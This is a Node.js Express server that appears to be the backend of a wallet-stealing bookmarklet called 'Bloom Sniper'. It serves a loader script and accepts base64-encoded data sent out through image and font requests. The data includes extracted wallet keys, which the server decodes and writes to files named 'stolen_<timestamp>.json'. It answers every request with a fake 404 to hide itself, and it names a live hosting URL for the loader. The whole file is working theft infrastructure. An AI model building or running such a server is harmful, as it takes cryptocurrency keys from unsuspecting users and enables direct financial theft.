const express = require('express');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 10000;

console.log('========================================');
console.log('🚀 Bloom Sniper Backend Starting...');
console.log('========================================');

// Middleware
app.use(express.json({ limit: '10mb' })); // in case we need it later

// Serve static files for the loader
app.use('/axiom', express.static(path.join(__dirname, 'public/axiom')));

// Root route
app.get('/', (req, res) => {
  console.log('🌍 Root route accessed from', req.ip);
  res.status(404).send('Not Found');
});

// Direct /i route (no data)
app.get('/i', (req, res) => {
  console.log('📍 /i route accessed (no data)');
  res.status(404).json({ detail: "Not Found" });
});

// === MAIN DATA RECEIVING ROUTE (robust catch-all for img/font-face exfil) ===
app.get('/i/*', (req, res) => {
  console.log('🚀 /i/* ROUTE HIT - Data exfil received!');
  console.log('Full original URL:', req.originalUrl);
  console.log('URL length:', req.originalUrl.length);
  console.log('IP:', req.ip || req.connection.remoteAddress);
  console.log('User-Agent:', req.get('User-Agent'));

  let encodedData = '';

  // Extract base64 data - multiple fallback methods
  if (req.params[0]) {
    encodedData = req.params[0];
  } else if (req.originalUrl.includes('/i/')) {
    encodedData = req.originalUrl.split('/i/')[1] || '';
  }

  console.log('Raw encoded data length:', encodedData.length);
  console.log('First 80 chars:', encodedData.substring(0, 80));

  if (!encodedData || encodedData.length < 10) {
    console.log('❌ No valid data found in URL');
    return res.status(404).json({ detail: "Not Found" });
  }

  try {
    // Safe base64 decoding
    const decodedStr = Buffer.from(encodedData, 'base64').toString('utf-8');
    const payload = JSON.parse(decodedStr);

    console.log('✅ PAYLOAD DECODED SUCCESSFULLY');
    console.log('Payload summary:', {
      site: payload.site,
      walletsExtracted: payload.walletsExtracted || payload.keys?.length || 0,
      timestamp: payload.timestamp
    });
    console.log('Full payload:', JSON.stringify(payload, null, 2));

    // Save to stolen_data folder
    const dir = path.join(__dirname, 'stolen_data');
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }

    const filename = `stolen_${Date.now()}.json`;
    const filePath = path.join(dir, filename);

    fs.writeFileSync(filePath, JSON.stringify(payload, null, 2));

    console.log(`💾 SAVED SUCCESSFULLY: stolen_data/${filename}`);
    console.log('========================================');

    // Always return 404 like the original bloomsnipers to stay stealthy
    res.status(404).json({ detail: "Not Found" });
  } catch (err) {
    console.error('❌ DECODE FAILED:', err.message);
    console.error('Raw data (first 150 chars):', encodedData.substring(0, 150));
    res.status(404).json({ detail: "Not Found" });
  }
});

// Catch-all 404 for everything else
app.get('*', (req, res) => {
  console.log('404 - Unknown route:', req.originalUrl);
  res.status(404).json({ detail: "Not Found" });
});

// Start server
app.listen(PORT, '0.0.0.0', () => {
  console.log(`✅ SERVER IS LIVE ON PORT ${PORT}`);
  console.log(`📁 Loader URL: https://bloom-snipers-backend.onrender.com/axiom/loader.js`);
  console.log(`📡 Waiting for bookmarklet data on /i/* ...`);
  console.log('========================================');
});